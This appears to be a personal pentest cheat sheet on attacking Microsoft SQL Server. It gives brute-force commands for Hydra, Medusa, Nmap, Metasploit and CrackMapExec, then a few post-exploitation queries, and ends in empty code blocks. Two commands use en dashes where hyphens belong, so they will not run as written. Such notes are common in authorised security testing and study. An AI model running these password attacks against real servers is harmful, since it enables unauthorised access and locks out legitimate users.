---
id: Exploitation
aliases: []
tags:
  - Networking/Services/MSSQL/Exploitation
---

# Exploitation

___

<!-- Brute Force {{{-->
## Brute Force

> [!warning]
>
> This may block user accounts

> [!tip]
>
> Use the NetBIOS name of the machine as domain

<!-- Hydra {{{-->
### Hydra

Brute force with [[Hydra]]

```sh
hydra -L <usernames.txt> –P <passwords.txt> <target> mssql
```

<!-- }}} -->

<!-- Medusa {{{-->
### Medusa

```sh
medusa -h <target> –U <usernames.txt> –P <passwords.txt> –M mssql
```

<!-- }}} -->

<!-- Nmap {{{-->
### Nmap

Brute force with [[Nmap]]

```sh
nmap -p 1433 --script ms-sql-brute --script-args mssql.domain=<DOMAIN>,userdb=customuser.txt,passdb=custompass.txt,ms-sql-brute.brute-windows-accounts <target> -oA mssql-script-ms-sql-brute
```

<!-- }}} -->

<!-- Metasploit {{{-->
### Metasploit

```sh
msf> use auxiliary/scanner/mssql/mssql_login
```

> [!tip]
>
> Set the domain (if any) and use `USE_WINDOWS_ATHENT`

<!-- }}} -->

<!-- CrackMapExec {{{-->
### CrackMapExec

> [!warning]
>
> **Deprecated**

```sh
crackmapexec mssql <target> -d <domain_name> -u usernames.txt -p passwords.txt
```

<!-- }}} -->

___

<!-- }}} -->

# Post-Exploitation

Get MSSQL version

```sql
select @@version;
```

Get user

```sql
select user_name();
```

Get databases

```sql
SELECT name FROM master.dbo.sysdatabases;
```


```sql

```
```sql

```
```sql

```
```sql

```
```sql

```
```sql

```
```sql

```
